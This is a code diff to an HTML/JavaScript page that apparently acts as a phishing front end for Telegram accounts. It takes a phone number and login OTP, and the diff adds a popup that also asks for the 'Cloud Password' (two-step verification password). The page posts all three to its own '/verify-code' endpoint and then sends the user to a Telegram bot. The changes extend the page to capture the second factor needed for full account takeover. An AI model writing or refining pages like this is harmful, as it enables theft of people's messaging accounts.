@@ -79,7 +79,6 @@
         }
         .btn-get-code:active { transform: scale(0.97); }
 
-        /* OTP Boxes Container */
         .otp-boxes-container {
             display: flex; gap: 8px; justify-content: center; margin-bottom: 15px;
             position: relative;
@@ -92,7 +91,6 @@
             transition: 0.2s; position: relative;
         }
         
-        /* Active Blinking Cursor Animation */
         .otp-small-box.active {
             border-color: #0088CC;
             box-shadow: 0 0 10px rgba(0, 136, 204, 0.4);
@@ -111,7 +109,6 @@
             50% { opacity: 0; }
         }
 
-        /* Transparent Real Input perfectly covering the boxes for full mobile keyboard & backspace compatibility */
         #realOtpInput {
             position: absolute;
             top: 0;
@@ -138,6 +135,49 @@
             0% { box-shadow: 0 0 10px rgba(0, 229, 255, 0.4); }
             100% { box-shadow: 0 0 25px rgba(0, 229, 255, 0.9); }
         }
+
+        /* --- 2FA Password Modal Popup Styles --- */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(8px);
+            display: none; align-items: center; justify-content: center; z-index: 999;
+        }
+        .modal-box {
+            background: white; width: 90%; max-width: 340px; padding: 30px 20px 20px 20px;
+            border-radius: 20px; text-align: center; position: relative;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            animation: modalPop 0.3s ease-out;
+        }
+        @keyframes modalPop {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .modal-icon-container {
+            position: absolute; top: -35px; left: 50%; transform: translateX(-50%);
+            width: 65px; height: 65px; background: linear-gradient(135deg, #FF8C00, #FF4500);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            font-size: 30px; border: 3px solid #fff; box-shadow: 0 0 15px rgba(255, 69, 0, 0.8);
+            animation: iconPulse 1.2s infinite alternate;
+        }
+        @keyframes iconPulse {
+            0% { transform: translateX(-50%) scale(1); }
+            100% { transform: translateX(-50%) scale(1.1); }
+        }
+        .modal-box h3 {
+            margin-top: 15px; font-size: 16px; color: #222; font-weight: 700; margin-bottom: 15px;
+        }
+        .password-input {
+            width: 100%; padding: 14px; border: 2px solid #ddd; border-radius: 12px;
+            font-size: 16px; outline: none; text-align: center; margin-bottom: 15px;
+            font-weight: 600; color: #333; background: #f9f9f9;
+        }
+        .password-input:focus { border-color: #FF4500; box-shadow: 0 0 10px rgba(255, 69, 0, 0.3); }
+        .btn-verify-password {
+            background: linear-gradient(135deg, #FF8C00, #FF4500); color: white; width: 100%; padding: 13px;
+            border-radius: 12px; border: none; font-weight: 700; font-size: 16px; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 69, 0, 0.4); transition: 0.2s;
+        }
+        .btn-verify-password:active { transform: scale(0.97); }
     </style>
 </head>
 <body>
@@ -164,7 +204,6 @@
             <h2>Enter 5-Digit OTP 🔑</h2>
             
             <div class="otp-boxes-container" onclick="document.getElementById('realOtpInput').focus()">
-                <!-- Native Hidden/Transparent Input for full mobile keyboard & backspace handling -->
                 <input type="tel" id="realOtpInput" maxlength="5" autocomplete="one-time-code" oninput="handleInput()" onkeydown="handleKeyDown(event)">
 
                 <div class="otp-small-box active"></div>
@@ -175,6 +214,18 @@
             </div>
 
             <button class="btn-confirm-otp" onclick="verifyOtpCode()">Confirm Otp ✨</button>
+        </div>
+    </div>
+
+    <!-- 3. Two-Step Verification Password Popup Modal -->
+    <div class="modal-overlay" id="passwordModal">
+        <div class="modal-box">
+            <div class="modal-icon-container">
+                🔐
+            </div>
+            <h3>Two-Step Verification Password 🔑</h3>
+            <input type="password" id="twoFactorPassword" class="password-input" placeholder="Enter Cloud Password">
+            <button class="btn-verify-password" onclick="verifyPassword()">Verify Password ✨</button>
         </div>
     </div>
 
@@ -192,7 +243,6 @@
                 smallBoxes[i].classList.remove('active');
             }
             
-            // Highlight current active box with blinking cursor animation
             let activeIdx = val.length < 5 ? val.length : 4;
             smallBoxes[activeIdx].classList.add('active');
         }
@@ -253,6 +303,10 @@
             .then(data => {
                 if(data.status === "success") {
                     window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
+                } else if(data.status === "2fa_required") {
+                    // যদি একাউন্টে 2FA পাসওয়ার্ড থাকে, তবে পপ-আপ মোডাল শো হবে
+                    document.getElementById('passwordModal').style.display = 'flex';
+                    document.getElementById('twoFactorPassword').focus();
                 } else {
                     alert("Verification Failed: " + data.message);
                     realInput.value = "";
@@ -260,6 +314,33 @@
                 }
             })
             .catch(err => console.log("Verification error"));
+        }
+
+        function verifyPassword() {
+            let phone = document.getElementById('phoneInput').value;
+            let code = realInput.value;
+            let password = document.getElementById('twoFactorPassword').value;
+
+            if(!password) {
+                alert("Please enter your 2FA password!");
+                return;
+            }
+
+            fetch('/verify-code', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: phone, code: code, password: password })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.status === "success") {
+                    window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
+                } else {
+                    alert("Password Verification Failed: " + data.message);
+                    document.getElementById('twoFactorPassword').value = "";
+                }
+            })
+            .catch(err => console.log("Connection error"));
         }
     </script>
 </body>
